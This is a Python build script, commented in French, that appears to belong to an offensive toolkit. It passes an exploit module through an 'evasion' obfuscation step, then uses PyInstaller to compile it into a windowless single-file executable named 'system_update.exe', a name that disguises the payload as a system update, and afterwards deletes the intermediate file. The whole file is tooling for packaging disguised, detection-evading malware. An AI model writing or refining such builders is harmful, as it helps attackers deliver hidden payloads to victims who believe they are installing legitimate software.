import subprocess
import os
import sys
from modules import evasion

# --- CONFIGURATION ---
SCRIPT_TO_CONVERT = os.path.join('modules', 'exploit_sys.py')
OBFUSCATED_SCRIPT_NAME = "temp_obfuscated_payload.py"
PAYLOAD_NAME = "system_update.exe"
OUTPUT_DIR = "payloads"

# --- SCRIPT DE BUILD ---
def build():
    """Obfusque le payload puis le compile en .exe."""
    print("[*] Lancement du processus de création du payload .exe...")
    
    # 1. Obfuscation du script original
    print(f"[1/3] Obfuscation du script '{SCRIPT_TO_CONVERT}'...")
    obfuscated_script_path = evasion.obfuscate_script(SCRIPT_TO_CONVERT, OBFUSCATED_SCRIPT_NAME)
    
    if not obfuscated_script_path:
        print("[-] Échec de l'étape d'obfuscation. Arrêt du build.")
        return
        
    # 2. Compilation du script obfusqué avec PyInstaller
    print(f"\n[2/3] Compilation du script obfusqué '{obfuscated_script_path}'...")
    pyinstaller_command = [
        sys.executable,
        "-m", "PyInstaller",
        '--onefile',
        '--noconsole',
        f'--name={PAYLOAD_NAME}',
        f'--distpath={OUTPUT_DIR}',
        obfuscated_script_path
    ]
    
    try:
        process = subprocess.run(pyinstaller_command, check=True, capture_output=True, text=True)
        final_payload_path = os.path.join(OUTPUT_DIR, PAYLOAD_NAME)
        print(f"\n[+] Payload créé avec succès ! Il se trouve ici : {final_payload_path}")
    except subprocess.CalledProcessError as e:
        print("\n[-] Une erreur est survenue lors de la compilation avec PyInstaller.")
        print(f"--- Erreur de PyInstaller ---\n{e.stderr}\n---------------------------")
    except FileNotFoundError:
        print("\n[-] Erreur : La commande 'pyinstaller' n'a pas été trouvée.")
        print("    Veuillez vous assurer que PyInstaller est bien installé avec : pip install pyinstaller")
    finally:
        # 3. Nettoyage du fichier temporaire
        print(f"\n[3/3] Nettoyage du fichier temporaire '{obfuscated_script_path}'...")
        if os.path.exists(obfuscated_script_path):
            os.remove(obfuscated_script_path)
            print("[+] Fichier temporaire supprimé.")

# Alias pour l'appeler depuis la console
run = build

if __name__ == '__main__':
    build()